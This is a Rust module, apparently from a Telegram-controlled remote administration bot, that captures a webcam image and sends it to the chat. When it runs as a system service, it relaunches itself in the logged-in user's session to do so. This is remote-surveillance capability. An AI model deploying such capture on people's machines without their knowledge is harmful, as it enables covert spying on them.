use std::path::Path;

use anyhow::{Context, Result};
use teloxide::prelude::*;
use teloxide::types::{ChatId, MessageId};

use crate::bot::md;
use crate::machine::session;

pub async fn camera(bot: &Bot, chat_id: ChatId, reply_to: MessageId) -> Result<()> {
    let jpeg_buf = if session::is_system_session() {
        let tmp = std::env::temp_dir().join("_camera_tmp.jpg");
        let tmp_path = tmp.to_string_lossy().to_string();
        let exe = std::env::current_exe()?;
        let args = vec!["--camera".into(), tmp_path.clone()];

        match tokio::task::spawn_blocking(move || session::run_in_user_session(&exe, args, 15000))
            .await
        {
            Ok(Ok(_)) => {
                let data = std::fs::read(&tmp).context("cannot read camera output")?;
                let _ = std::fs::remove_file(&tmp);
                data
            }
            Ok(Err(e)) => {
                md::send(
                    bot,
                    chat_id,
                    reply_to,
                    format!("❌ {}", md::escape(&format!("Camera lỗi: {e}"))),
                )
                .await?;
                return Ok(());
            }
            Err(e) => {
                md::send(
                    bot,
                    chat_id,
                    reply_to,
                    format!("❌ {}", md::escape(&format!("Task error: {e}"))),
                )
                .await?;
                return Ok(());
            }
        }
    } else {
        match capture_camera() {
            Ok(buf) => buf,
            Err(e) => {
                md::send(
                    bot,
                    chat_id,
                    reply_to,
                    format!("❌ {}", md::escape(&format!("Camera lỗi: {e}"))),
                )
                .await?;
                return Ok(());
            }
        }
    };

    md::send_photo(
        bot,
        chat_id,
        reply_to,
        teloxide::types::InputFile::memory(jpeg_buf),
    )
    .await
}

fn capture_camera() -> Result<Vec<u8>> {
    use nokhwa::Camera;
    use nokhwa::pixel_format::RgbFormat;
    use nokhwa::utils::{CameraIndex, RequestedFormat, RequestedFormatType};

    let index = CameraIndex::Index(0);
    let requested =
        RequestedFormat::new::<RgbFormat>(RequestedFormatType::AbsoluteHighestResolution);
    let mut cam = Camera::new(index, requested)?;
    cam.open_stream()?;
    let frame = cam.frame()?;
    let decoded = frame.decode_image::<RgbFormat>()?;

    let (width, height) = (decoded.width(), decoded.height());
    let raw = decoded.into_raw();
    let img = image::RgbImage::from_raw(width, height, raw)
        .ok_or_else(|| anyhow::anyhow!("invalid camera image"))?;

    let mut jpeg_buf = Vec::new();
    let mut encoder = image::codecs::jpeg::JpegEncoder::new_with_quality(&mut jpeg_buf, 75);
    encoder.encode_image(&img)?;
    Ok(jpeg_buf)
}

pub fn capture_to_file(path: &str) -> Result<()> {
    let jpeg = capture_camera()?;
    std::fs::write(Path::new(path), &jpeg).context("cannot write camera file")?;
    Ok(())
}
